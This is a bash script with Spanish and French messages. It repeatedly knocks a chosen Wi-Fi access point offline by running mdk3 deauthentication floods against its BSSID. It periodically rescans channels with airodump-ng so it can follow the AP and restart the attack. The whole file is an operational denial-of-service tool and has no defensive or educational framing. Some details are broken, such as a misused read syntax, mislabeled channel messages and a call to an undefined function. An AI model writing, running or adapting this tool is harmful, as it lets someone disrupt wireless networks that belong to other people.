#!/bin/bash
echo $$ >/tmp/terminalbis.pid

#####################################################

f_variables(){
intmoniteurbis="$(cat cartedos.txt)"
canalbis="$(cat apcanalbis.txt)"
BSSIDBIS="$(cat apmacbis.txt)"
ESSIDBIS="$(cat ssidbis.txt)"
echo "$intmoniteurbis"
while [ -z "${intmoniteurbis}" ]; do read -r ${intmoniteurbis}; done



echo "$canalbis"
while [ -z "${canalbis}" ]; do read -r ${canalbis}; done



echo "$BSSIDBIS"
while [ -z ${BSSIDBIS} ]; do read -r ${BSSIDBIS}; done



echo "$ESSIDBIS"
while [ -z "${ESSIDBIS}" ]; do read -r ${ESSIDBIS}; done
f_floodinstantane
}


#####################################################

f_checkap(){              
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c $canalbis --essid ${ESSIDBIS} -w track ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP no ha movido, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/mdk3bis.pid`
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP ha movido... buscando le...\e[0m"
sleep 1;
rm -rf track*
kill `cat /tmp/mdk3bis.pid`
kill `cat /tmp/airodumpbis.pid`
sleep 5;
fi

canal=1
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canalbis} --essid ${ESSIDBIS} -w track1 ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track1-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 1, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en canal 1... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
fi

canal=11
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canalbis} --essid ${ESSIDBIS} -w track11 ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track11-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 11, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en canal 11... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
fi

canal=6
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canalbis} --essid ${ESSIDBIS} -w track6 ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track6-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 6, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en canal 6... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
fi

canal=13
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canalbis} --essid ${ESSIDBIS} -w track13 ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track13-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 13, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en canal 13... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
fi

canal=5
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canalbis} --essid ${ESSIDBIS} -w track5 ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track5-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 5, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en canal 3... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
fi

canal=12
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canalbis} --essid ${ESSIDBIS} -w track12 ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track12-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 12, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
fi

canal=3
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canalbis} --essid ${ESSIDBIS} -w track3 ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track3-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 3, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
fi

canal=10
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canalbis} --essid ${ESSIDBIS} -w track10 ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track10-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 10, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
fi

canal=7
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canalbis} --essid ${ESSIDBIS} -w track7 ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track7-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 7, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
fi

canal=2
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canalbis} --essid ${ESSIDBIS} -w track2 ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track2-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 2, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
fi

canal=8
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canalbis} --essid ${ESSIDBIS} -w track8 ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track8-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 8, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
fi

canal=4
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canalbis} --essid ${ESSIDBIS} -w track4 ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track4-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 4, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
fi

canal=9
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canalbis} --essid ${ESSIDBIS} -w track9 ${intmoniteurbis}mon &> /dev/null &
echo $! >/tmp/airodumpbis.pid
sleep 7;
if grep -q "${BSSIDBIS}" "track9-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 9, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodumpbis.pid`
rm -rf track*
fi
}

#####################################################

f_floodinstantane(){       # boucle 1 qui test le contenu du fichier en appelant la fonction boucle 2 toute les x seconde  (fonction juste au dessus f_checkap)
           echo -e "\e[1;34m[*]\e[0m Iniciando el DoS... el canal del AP  va a estar vérificando cada tiempo en segundas que has entrado..."
sleep 1;
xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk3 ${intmoniteurbis}mon d -g -t ${BSSIDBIS} -c ${canalbis} &> /dev/null &
echo $! >/tmp/mdk3bis.pid
sleep 4;
while : ; do
sleep 840 ; f_checkap ; done
}


#####################################################
f_activedos(){
clear
echo "1.  Dos"
read -p "Choix: " menuchoix
case ${menuchoix} in
1) unset clean; f_floodinterface ;;
*) f_activedos ;;
esac
}


# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[!]\e[0m Ve te pedir al admin !" 1>&2
	exit 1
else
	clean=1
	f_variables
fi
